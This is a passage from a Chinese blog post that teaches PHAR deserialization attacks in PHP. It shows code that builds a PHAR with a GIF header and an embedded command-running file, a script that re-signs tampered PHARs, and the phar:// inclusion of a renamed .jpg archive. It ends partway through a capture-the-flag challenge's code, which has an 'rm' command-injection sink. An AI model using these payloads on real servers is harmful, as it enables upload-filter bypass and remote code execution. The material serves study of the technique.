@@ -1,0 +1,1528 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="phar~"><title>浅析phar反序列化</title><link rel=canonical href=https://baozongwi.xyz/p/phar-deserialization-analysis/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="浅析phar反序列化"><meta property='og:description' content="phar~"><meta property='og:url' content='https://baozongwi.xyz/p/phar-deserialization-analysis/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='phar'><meta property='article:published_time' content='2024-09-05T19:28:03+00:00'><meta property='article:modified_time' content='2024-09-05T19:28:03+00:00'><meta name=twitter:title content="浅析phar反序列化"><meta name=twitter:description content="phar~"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#概念>概念</a></li><li><a href=#结构>结构</a><ol><li><a href=#stub>stub</a></li><li><a href=#manifest>manifest</a><ol><li><a href=#meta-data>meta-data</a></li></ol></li><li><a href=#contents>contents</a></li><li><a href=#signature>signature</a></li></ol></li><li><a href=#配置phpini>配置php.ini</a></li><li><a href=#受影响函数列表>受影响函数列表</a></li><li><a href=#demo1>demo1</a></li><li><a href=#demo2>demo2</a></li><li><a href=#demo3>demo3</a></li><li><a href=#demo4>demo4</a></li><li><a href=#demo5>demo5</a></li><li><a href=#demo6>demo6</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/phar-deserialization-analysis/>浅析phar反序列化</a></h2><h3 class=article-subtitle>phar~</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-09-05T19:28:03Z>Sep 05, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 524 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>之前在学习php反序列化的时候难免会遇到phar文件的反序列化来恶意载入马，但是始终难以理解这样的姿势，现在再去看，貌似也释然了，这个常用姿势，拿下(以后拿ezphp来骗我也不怕啦)</p><h1 id=0x02-question>0x02 question</h1><h2 id=概念>概念</h2><p><strong>PHAR</strong> 文件（PHP Archive）是一种用于将多个 PHP 文件和其他资源（如图片、配置文件等）打包成一个单一文件的归档格式，类似于 JAR 文件在 Java 中的功能。PHAR 文件通常用于分发 PHP 应用程序或库，因为它简化了部署，允许将整个项目封装在一个文件中，而不是多个独立文件。<strong>相当于是一个文件夹里面可存放多个<code>php</code>文件</strong>,并且是<strong>不需要解压</strong>的,只不过在web中需要用到<code>phar</code>协议来进行解析</p><h2 id=结构>结构</h2><blockquote><p>a stub (文件头)</p><p>a manifest describing the contents (压缩文件信息)</p><p>the file contents (压缩文件内容)</p><p>[optional] a signature for verifying Phar integrity (phar file format only) (签名)</p></blockquote><h3 id=stub>stub</h3><p>也就是一个标志吧,格式为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>xxx</span><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>xxx</span><span class=p>;</span> <span class=nx>__HALT_COMPILER</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p><code>php</code>语句前面的内容不限，但是语句中必须要有<code>__HALT_COMPILER()</code>,否则<code>phar</code>扩展将无法识别这个文件为<code>phar</code>文件</p><h3 id=manifest>manifest</h3><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的路径、大小、权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><h4 id=meta-data>meta-data</h4><blockquote><p>meta-data：这是 PHAR 文件的一个特殊功能，允许用户将任意数据存储为文件的元数据，并将其序列化后保存在 Manifest 中。</p><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p></blockquote><h3 id=contents>contents</h3><p>被压缩文件的内容，比如一句话?:D)</p><h3 id=signature>signature</h3><p><img src=/p/phar-deserialization-analysis/QQ20240905-201458.png width=741 height=405 loading=lazy alt=1></p><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名</p><p>EXP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;test.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> 
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span> <span class=c1># 获取要签名的数据</span>
+</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span> <span class=c1># 获取签名类型和GBMB标识</span>
+</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span> <span class=c1># 数据 + 签名 + (类型 + GBMB)</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;newtest.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span> <span class=c1># 写入新文件</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=配置phpini>配置php.ini</h2><p>或许你自己学习之后兴高采烈的开始了这里的舒坦的时候，诶发现，这怎么生成不了文件在当前目录呢，我们仅仅只是需要修改一个配置就可以了</p><p>打开<code>php.ini</code>找到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[Phar]
+</span></span><span class=line><span class=cl>; http://php.net/phar.readonly
+</span></span><span class=line><span class=cl>;phar.readonly = On
+</span></span></code></pre></td></tr></table></div></div><p><code>;</code>意味着这一行其实是被注释了的，我们把<code>;</code>删掉改成</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[Phar]
+</span></span><span class=line><span class=cl>; http://php.net/phar.readonly
+</span></span><span class=line><span class=cl>phar.readonly = Off
+</span></span></code></pre></td></tr></table></div></div><p>就可以生成phar文件了</p><h2 id=受影响函数列表>受影响函数列表</h2><div class=table-wrapper><table><thead><tr><th style=text-align:left>受影响函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td style=text-align:left>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td style=text-align:left>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td style=text-align:left>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td style=text-align:left>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td style=text-align:left>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td style=text-align:left>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table></div><h2 id=demo1>demo1</h2><p>这里我们自己写一个最简单的来尝试一下,并且利用010看看底层数据信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bao&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>     <span class=c1>//开缓冲
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>=</span><span class=k>new</span> <span class=nx>Hello</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;m.php&#34;</span><span class=p>,</span><span class=s2>&#34;&lt;?=system(&#39;dir&#39;);?&gt;&#34;</span><span class=p>);</span>  <span class=c1>//写入m.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>      <span class=c1>//关缓冲
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/phar-deserialization-analysis/QQ20240905-202445.png width=1031 height=348 loading=lazy alt=2></p><p>嗯确实是序列化存储的，并且也都验证了之前所说的结构,同时来包含试试看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;phar://phar.phar&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Hello</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>成功了<code>GIF89abao</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=c1>// 包含并执行 PHAR 文件中的 m.php 文件
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>include</span><span class=p>(</span><span class=s1>&#39;phar://phar.phar/m.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>这样的话也成功执行了命令，那么本身我们就有图片头我们能不能不写<code>phar</code>来绕过呢</p><p>没错很简单，经过我的测试，由于有图片头，所以直接改文件后缀即可包含</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=c1>// 包含并执行 PHAR 文件中的 m.php 文件
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>include</span><span class=p>(</span><span class=s1>&#39;phar://phar.jpg/m.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><h2 id=demo2>demo2</h2><p><strong>ctfshow_web276</strong>,这道题我可是等了好久，终于能打了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>filter</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filecontent</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$evilfile</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$admin</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=nv>$fn</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>=</span><span class=nv>$f</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filecontent</span><span class=o>=</span><span class=nv>$fn</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>checkevil</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/php|\.\./i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag/i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filecontent</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>admin</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm &#39;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
